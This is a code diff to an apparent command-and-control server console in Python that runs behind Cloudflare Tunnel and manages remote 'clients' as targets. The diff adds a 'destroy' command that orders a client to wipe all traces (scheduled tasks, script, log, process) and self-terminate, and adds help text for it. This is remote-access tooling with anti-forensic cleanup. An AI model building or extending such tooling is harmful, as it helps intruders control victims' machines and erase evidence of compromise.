@@ -5,7 +5,7 @@ and cancel support. Runs on Mac behind Cloudflare Tunnel.
 Usage: python3 server.py
 """
 
-VERSION = "3.1.2"
+VERSION = "3.1.3"
 
 # ── Auth ─────────────────────────────────────────────────────────────────────
 # Set TOKEN to any hard-to-guess string (e.g. a random UUID).
@@ -620,6 +620,28 @@ def input_loop():
                     print(f"[!] No client matching '{target}'.")
             continue
 
+        if stripped.startswith("destroy ") or stripped == "destroy":
+            target = cmd.strip()[8:].strip() if stripped.startswith("destroy ") else ""
+            with lock:
+                if not target:
+                    if not active_client:
+                        print("[*] No active client. Use 'use <id>' or 'destroy <id>'.")
+                        continue
+                    target = active_client
+                match = _resolve_client(target)
+                if match:
+                    clients[match]["pending_command"] = "destroy"
+                    clients[match]["cmd_event"].set()
+                    clients[match]["pending_stdin"] = []
+                    print(f"[*] Destroy command sent to {match}.")
+                    print(f"[*] Client will wipe all traces and self-terminate.")
+                    if active_client == match:
+                        active_client = None
+                        print("[*] Active target cleared.")
+                else:
+                    print(f"[!] No client matching '{target}'.")
+            continue
+
         if stripped.startswith("remove "):
             target = cmd.strip()[7:].strip()
             if not target:
@@ -647,6 +669,8 @@ def input_loop():
             print("    use <id>          Switch active target (name or #)")
             print("    status            Check if active client is online")
             print("    kill <id>         Send exit to client (removes it)")
+            print("    destroy           Wipe all traces on active client (tasks, script, log, process)")
+            print("    destroy <id>      Wipe all traces on specific client")
             print("    remove <id>       Remove stale client from list")
             print()
             print("  EXAMPLES:")
